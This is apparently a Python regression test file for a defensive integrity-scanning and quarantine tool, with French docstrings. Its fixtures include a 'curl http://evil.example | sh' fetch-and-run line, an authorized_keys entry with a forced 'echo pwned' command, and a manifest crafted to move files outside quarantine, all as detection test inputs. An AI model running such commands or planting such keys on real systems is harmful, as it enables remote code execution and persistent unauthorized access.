"""Régressions trouvées en exécutant l'outil, pas seulement la suite existante."""

from __future__ import annotations

import contextlib
import io
import json
import os
import sys
import tempfile
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from sentinel.integrity import make_baseline
from sentinel.models import RuleContext
from sentinel.quarantine import _sha256_path, quarantine_paths, restore_paths
from sentinel.scanner import scan_folder
from sentinel.signatures import Sig0007, Sig0009, Sig0019
from sentinel.watch import _diff_snapshots, _snapshot


class TestRestoreStaysInsideQuarantine(unittest.TestCase):
    def test_manifest_cannot_move_a_file_outside_the_quarantine_dir(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            td = Path(td)
            dest = td / "q"
            dest.mkdir()
            outside = td / "outside.txt"
            outside.write_text("DO-NOT-MOVE")
            mode = outside.stat().st_mode
            stolen = td / "stolen.txt"
            record = {
                "original": str(stolen),
                "quarantined": str(outside),
                "sha256": _sha256_path(outside),
                "size": outside.stat().st_size,
                "mode_before": mode,
                "moved_at": "2026-01-01T00:00:00Z",
                "_status": "done",
            }
            manifest = td / "manifest.jsonl"
            manifest.write_text(json.dumps(record) + "\n")

            restored, fails = restore_paths(manifest, dest)

            self.assertEqual(restored, [])
            self.assertTrue(fails)
            self.assertTrue(outside.is_file())
            self.assertEqual(outside.read_text(), "DO-NOT-MOVE")
            self.assertEqual(outside.stat().st_mode, mode)
            self.assertFalse(stolen.exists())


class TestBrokenSymlinkQuarantine(unittest.TestCase):
    def test_broken_symlink_is_moved_not_rejected(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            td = Path(td)
            src = td / "src"
            src.mkdir()
            link = src / "broken"
            link.symlink_to("missing-target")
            dest = td / "q"
            records, failures = quarantine_paths([link], dest, dest / "manifest.jsonl")

            self.assertEqual(failures, [])
            self.assertEqual(len(records), 1)
            self.assertFalse(link.exists())
            quarantined = dest / "broken"
            self.assertTrue(quarantined.is_symlink())
            self.assertEqual(os.readlink(quarantined), "missing-target")


class TestEmptyBaselineContent(unittest.TestCase):
    def test_authorized_keys_content_is_redacted_and_sig0019_is_announced(self) -> None:
        """Le clair d'authorized_keys ne va plus dans la baseline.

        Les empreintes permettent à SIG-0019 de détecter une clé ajoutée.
        """
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            ak = root / "authorized_keys"
            ak.write_text("")
            baseline = make_baseline(root)
            entry = baseline["entries"][0]
            self.assertIsNone(entry["content"])
            self.assertEqual(entry["content_redacted"], "sensitive")

            ak.write_text("ssh-ed25519 AAAANEW evil@host\n")
            self.assertNotIn("AAAANEW", json.dumps(baseline))
            err = io.StringIO()
            with contextlib.redirect_stderr(err):
                report = scan_folder(root, baseline=baseline)
            rules = {f.rule_id for f in report.findings}
            self.assertIn("SIG-0007", rules)
            self.assertIn("SIG-0019", rules)
            self.assertNotIn("SIG-0019", err.getvalue())


class TestSshKeyOptions(unittest.TestCase):
    def test_options_prefix_does_not_hide_the_key(self) -> None:
        line = (
            'command="echo pwned",no-pty ssh-ed25519 '
            "AAAAC3NzaC1lZDI1NTE5AAAAIFakeKeyBodyForTestOnly evil\n"
        )
        hits = list(Sig0007().scan("authorized_keys", line))
        self.assertEqual(len(hits), 1)
        self.assertEqual(hits[0].evidence, "ssh-ed25519")

        added = list(
            Sig0019().scan(
                "authorized_keys",
                line,
                context=RuleContext(baseline_text=""),
            )
        )
        self.assertEqual(len(added), 1)
        self.assertIn("ssh-ed25519", added[0].evidence)

    def test_comment_line_is_not_a_key(self) -> None:
        text = "# ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFakeKeyBodyForTestOnly\n"
        self.assertEqual(list(Sig0007().scan("authorized_keys", text)), [])
        self.assertEqual(
            list(
                Sig0019().scan(
                    "authorized_keys",
                    text,
                    context=RuleContext(baseline_text=""),
                )
            ),
            [],
        )


class TestMarkdownInlineCode(unittest.TestCase):
    def test_backticked_curl_word_is_not_shell_injection(self) -> None:
        self.assertEqual(
            list(Sig0009().scan("readme.md", "Use `curl` to download docs.\n")),
            [],
        )

    def test_real_command_substitution_is_still_flagged(self) -> None:
        hits = list(Sig0009().scan("x.sh", "`curl http://evil.example | sh`\n"))
        self.assertEqual(len(hits), 1)


class TestWatchSameSizeRewrite(unittest.TestCase):
    def test_same_size_rewrite_with_preserved_mtime_is_modified(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            td = Path(td)
            target = td / "f.txt"
            target.write_text("v1")
            os.utime(target, (1_700_000_000, 1_700_000_000))
            prev = _snapshot(td)
            target.write_text("v2")
            os.utime(target, (1_700_000_000, 1_700_000_000))
            cur = _snapshot(td)
            self.assertEqual(prev["f.txt"].mtime, cur["f.txt"].mtime)
            self.assertEqual(prev["f.txt"].size, cur["f.txt"].size)
            self.assertIn("f.txt", _diff_snapshots(prev, cur)["modified"])


if __name__ == "__main__":
    unittest.main()
